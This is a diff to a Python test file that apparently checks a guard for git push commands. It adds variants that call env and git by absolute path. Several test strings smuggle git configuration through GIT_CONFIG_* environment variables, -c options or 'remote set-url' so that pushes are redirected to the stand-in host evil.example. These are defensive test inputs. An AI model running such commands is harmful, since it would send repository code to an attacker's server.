@@ -66,6 +66,9 @@ def _git_env() -> dict[str, str]:
 		"env GIT_CONFIG_COUNT=1 git push origin HEAD:feature/x",
 		"env -i git push origin HEAD:feature/x",
 		"env -u GIT_CONFIG_COUNT git push origin HEAD:feature/x",
+		"/usr/bin/env GIT_CONFIG_COUNT=1 /usr/bin/git push origin HEAD:feature/x",
+		"/usr/bin/env -i /usr/bin/git push origin HEAD:feature/x",
+		"env -u GIT_CONFIG_COUNT /usr/bin/git push origin HEAD:feature/x",
 		"/usr/bin/git push origin HEAD",
 	],
 )
@@ -1508,6 +1511,7 @@ def test_empty_pushurl_is_not_treated_as_fetch_url(merged_branch_repo, monkeypat
 	"GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin HEAD:feature/x",
 	'''GIT_CONFIG_PARAMETERS="'url.https://evil.example/.pushInsteadOf=https://github.com/o/'" git push origin HEAD:feature/x''',
 	"env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin HEAD:feature/x",
+	"/usr/bin/env GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ /usr/bin/git push origin HEAD:feature/x",
 	"git -c url.https://evil.example/.pushInsteadOf=https://github.com/o/ push https://github.com/o/r.git HEAD:feature/x",
 	"git -c remote.pushDefault=other push HEAD:feature/x",
 ])
@@ -1593,6 +1597,8 @@ def test_explicit_non_github_pushurl_is_not_rewritten(merged_branch_repo, monkey
 	"git remote set-url origin https://evil.example/o/r.git && git push origin HEAD:feature/x",
 	"env -i git push origin HEAD:feature/x",
 	"env -u GIT_CONFIG_COUNT git push origin HEAD:feature/x",
+	"/usr/bin/env -i /usr/bin/git push origin HEAD:feature/x",
+	"env -u GIT_CONFIG_COUNT /usr/bin/git push origin HEAD:feature/x",
 	"env -S 'GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=url.https://evil.example/.pushInsteadOf GIT_CONFIG_VALUE_0=https://github.com/o/ git push origin HEAD:feature/x'",
 	"env --split-string='git push origin HEAD:feature/x'",
 	"env -i -S 'git push origin HEAD:feature/x'",
